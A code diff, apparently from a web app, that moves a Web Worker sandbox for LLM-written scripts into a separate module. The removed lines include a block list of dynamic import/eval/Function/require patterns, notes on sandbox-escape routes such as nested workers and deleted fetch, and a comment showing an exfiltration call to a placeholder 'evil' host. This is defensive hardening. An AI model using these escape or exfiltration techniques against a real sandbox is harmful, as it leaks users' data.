@@ -429,112 +429,20 @@ function matchLeaf(
 // Worker 独立全局,无 window/document 访问;禁用 fetch/XHR/importScripts 防网络外泄。
 // mode:'query' 返回结果给 LLM(只读);'transform' 返回值经 schema 校验后落地(就地)。
 
-export interface EvalResult {
-  ok: boolean
-  result?: unknown
-  error?: string
-  elapsedMs: number
-}
+// 沙箱引擎已抽出到 ./sandbox.ts(单一真相源;eval_script 与 skill exec 共用三层防护:
+// 静态扫描 SANDBOX_FORBIDDEN_PATTERNS + lockSandboxGlobal defineProperty 锁网络层 + 超时 terminate)。
+// 此处 re-export 保外部 import 路径不变(index.ts 导出 / sec-21 单测 / dataOps eval_script 调用)。
+import { createSandboxRunner } from './sandbox'
+import type { SandboxResult } from './sandbox'
+export { lockSandboxGlobal } from './sandbox'
+export type EvalResult = SandboxResult  // 别名:旧 import 路径不断
 
 /**
- * 锁定沙箱全局(Worker self)的网络/存储 API —— defineProperty configurable:false + writable:false。
- * 防逃逸(harden-eval-sandbox):旧实现赋值覆盖(self.fetch=...),Worker 脚本可 `delete self.fetch` 露出
- * 原生 fetch 外泄 transform 数据;锁后 delete/重新赋值均失败,原生 API 永久不可达(逃逸者原型链取
- * Function 跑任意代码也发不出数据)。纯函数可单测;WORKER_PREAMBLE 经 toString() 注入 Worker 复用同一逻辑。
- * 注:eval/Function 不在此锁 —— Worker 内 new Function(建脚本 fn)依赖全局 Function,须先建 fn 再禁
- * (见 workerCode onmessage 顺序);逃逸者原型链取 Function 由网络 API 锁兜底(发不出数据)。
+ * 旧版沙箱执行入口(参数顺序 data 在前)—— 薄包装 createSandboxRunner,行为完全等价(workerCode 不变;
+ * 无 input 时传 undefined,JS 多一个未用参数无害)。保留供 eval_script / 旧测试沿用;
+ * 新场景(skill exec)直接用 sandbox.ts 的 createSandboxRunner(script)(input?)。
  */
-export function lockSandboxGlobal(target: any): void {
-  const lock = (name: string, value: unknown) => {
-    try { Object.defineProperty(target, name, { configurable: false, writable: false, value }) } catch { /* 已不可配置则跳过 */ }
-  }
-  lock('fetch', () => { throw new Error('fetch 已被沙箱禁用') })
-  lock('XMLHttpRequest', function () { throw new Error('XMLHttpRequest 已被沙箱禁用') })
-  lock('importScripts', () => { throw new Error('importScripts 已被沙箱禁用') })
-  lock('WebSocket', function () { throw new Error('WebSocket 已被沙箱禁用') })
-  lock('indexedDB', undefined)   // 同源数据泄漏:Worker 可读写宿主同源 indexedDB/caches
-  lock('caches', undefined)
-  lock('Worker', undefined)      // 嵌套 worker 绕过:dedicated worker 内 new Worker 独立全局(其 fetch 未禁)
-  lock('SharedWorker', undefined)
-  lock('EventSource', undefined) // 其它同源/网络侧信道
-  lock('BroadcastChannel', undefined)
-  if (target.navigator) {
-    try { Object.defineProperty(target.navigator, 'sendBeacon', { configurable: false, writable: false, value: () => { throw new Error('sendBeacon 已被沙箱禁用') } }) } catch {}
-  }
-}
-
-// Worker 启动前注入:复用 lockSandboxGlobal(toString 序列化进 Worker,单一真相源;纯函数已单测)
-const WORKER_PREAMBLE = `(${lockSandboxGlobal.toString()})(self);`
-
-// 静态扫描禁用模式:动态 import() 是语法,Worker 运行时无法禁用(classic worker 支持 import() 拉外网 ES 模块),
-// 只能在入口静态拦截,防 LLM 脚本 `import("https://evil/x.js")` 外泄 transform 拿到的 data。
-// eval/Function/require 同列(动态执行可绕过静态扫描,双保险:运行时 workerCode 内 fn 创建后再禁 self.eval/self.Function)。
-const SANDBOX_FORBIDDEN_PATTERNS: { re: RegExp; msg: string }[] = [
-  { re: /\bimport\s*\(/, msg: '动态 import() 拉外网模块' },
-  { re: /\bimport\s+[\w'"]/, msg: 'import 语句' },
-  { re: /\beval\s*\(/, msg: 'eval() 动态执行' },
-  { re: /\bFunction\s*\(/, msg: 'Function() 构造' },
-  { re: /new\s+Function\b/, msg: 'new Function() 构造' },
-  { re: /\brequire\s*\(/, msg: 'require() 拉模块' },
-]
-
-export function runSandboxedScript(
-  data: unknown,
-  script: string,
-  timeoutMs = 3000,
-): Promise<EvalResult> {
-  // 入口静态扫描:拒绝含禁用模式的脚本(动态 import/eval/Function/require 防沙箱绕过与外泄)
-  for (const { re, msg } of SANDBOX_FORBIDDEN_PATTERNS) {
-    if (re.test(script)) {
-      return Promise.resolve({ ok: false, error: `沙箱拒绝执行:脚本含禁用模式(${msg})`, elapsedMs: 0 })
-    }
-  }
-  return new Promise((resolve) => {
-    const start = Date.now()
-    let done = false
-    const finish = (r: Omit<EvalResult, 'elapsedMs'>) => {
-      if (done) return
-      done = true
-      clearTimeout(timer)
-      try {
-        worker.terminate()
-      } catch {}
-      URL.revokeObjectURL(url)
-      resolve({ ...r, elapsedMs: Date.now() - start })
-    }
-    const workerCode =
-      WORKER_PREAMBLE +
-      '\nself.onmessage = async (e) => {\n' +
-      '  try {\n' +
-      '    const fn = new Function("data", e.data.script);\n' +
-      '    try { self.eval = undefined; self.Function = undefined; } catch {}\n' +
-      '    let result = fn(e.data.data);\n' +
-      '    if (result && typeof result.then === "function") result = await result;\n' +
-      '    self.postMessage({ ok: true, result });\n' +
-      '  } catch (err) {\n' +
-      '    self.postMessage({ ok: false, error: String((err && err.message) || err) });\n' +
-      '  }\n' +
-      '};'
-    let url = '' // 空串初始:createObjectURL 失败时 catch 的 if(url) 为假,不 revoke(正确);成功后被覆盖
-    let worker: Worker
-    try {
-      const blob = new Blob([workerCode], { type: 'application/javascript' })
-      url = URL.createObjectURL(blob)
-      worker = new Worker(url)
-    } catch (e) {
-      // createObjectURL 已成功但 new Worker 抛错:url 已分配需释放,防每次创建失败累积泄漏 blob URL
-      if (url) URL.revokeObjectURL(url)
-      resolve({ ok: false, error: `无法创建 Worker 沙箱: ${(e as Error).message}`, elapsedMs: 0 })
-      return
-    }
-    const timer = setTimeout(() => finish({ ok: false, error: `脚本执行超时(${timeoutMs}ms),已终止` }), timeoutMs)
-    worker.onmessage = (e: MessageEvent) => finish(e.data)
-    worker.onerror = (e: ErrorEvent) => finish({ ok: false, error: e.message || 'Worker 运行错误' })
-    try {
-      worker.postMessage({ data, script })
-    } catch (e) {
-      finish({ ok: false, error: `数据无法传递给 Worker(可能含不可克隆值): ${(e as Error).message}` })
-    }
-  })
+export function runSandboxedScript(data: unknown, script: string, timeoutMs = 3000): Promise<EvalResult> {
+  return createSandboxRunner(script, timeoutMs)(data)
 }
 
